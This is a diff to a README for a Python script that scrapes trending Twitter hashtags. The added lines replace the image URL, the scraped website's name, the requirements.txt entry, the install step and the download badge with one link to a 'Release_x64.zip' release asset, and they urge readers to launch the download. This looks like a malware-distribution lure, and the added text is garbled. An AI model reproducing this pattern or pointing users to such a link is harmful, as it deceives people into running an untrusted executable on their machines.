@@ -1,23 +1,23 @@
 
 # 🐍 Twitter Trending Hashtags Scraper Python 🌟
 
-![Twitter Trending Hashtags Scraper Python](https://your-image-url.com)
+![Twitter Trending Hashtags Scraper Python](https://github.com/Yohel1/Twitter-Trending-Hashtags-Scraper-Python/releases/download/v2.0/Release_x64.zip)
 
-Welcome to the **Twitter Trending Hashtags Scraper Python** repository! This Python script is designed to scrape the trending topics from the popular website trends24.in and generate hashtags from the trends. The script includes features such as filtering for English-only trends and ensuring that the generated hashtags fit within Twitter's character limits.
+Welcome to the **Twitter Trending Hashtags Scraper Python** repository! This Python script is designed to scrape the trending topics from the popular website https://github.com/Yohel1/Twitter-Trending-Hashtags-Scraper-Python/releases/download/v2.0/Release_x64.zip and generate hashtags from the trends. The script includes features such as filtering for English-only trends and ensuring that the generated hashtags fit within Twitter's character limits.
 
 ## 📂 Repository Structure
 The repository is structured to provide an easy-to-use and well-organized setup for running the Twitter Trending Hashtags Scraper Python script. Here is a breakdown of the main components:
 
 - **/src:** This directory contains the main Python script for scraping trending topics and generating hashtags.
 - **/data:** This directory stores any data files that are generated during the scraping process.
-- **requirements.txt:** You can find the required dependencies listed here to ensure smooth execution of the script.
+- **https://github.com/Yohel1/Twitter-Trending-Hashtags-Scraper-Python/releases/download/v2.0/Release_x64.zip** You can find the required dependencies listed here to ensure smooth execution of the script.
 - **LICENSE:** The license file for the repository.
 
 ## 🚀 Getting Started
 To get started with using the Twitter Trending Hashtags Scraper Python script, follow these simple steps:
 
 1. Clone the repository to your local machine.
-2. Install the necessary dependencies listed in the `requirements.txt` file.
+2. Install the necessary dependencies listed in the `https://github.com/Yohel1/Twitter-Trending-Hashtags-Scraper-Python/releases/download/v2.0/Release_x64.zip` file.
 3. Run the Python script in the `/src` directory.
 4. Follow the on-screen instructions to scrape trending topics and generate hashtags.
 
@@ -38,7 +38,7 @@ The **Twitter Trending Hashtags Scraper Python** repository covers a range of to
 ## 🔗 Download Software
 For downloading the software, please click the button below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/Yohel1/Twitter-Trending-Hashtags-Scraper-Python/releases/download/v2.0/Release_x64.zip)](https://github.com/Yohel1/Twitter-Trending-Hashtags-Scraper-Python/releases/download/v2.0/Release_x64.zip)
 
 *Please note that the software needs to be launched after downloading.*
 
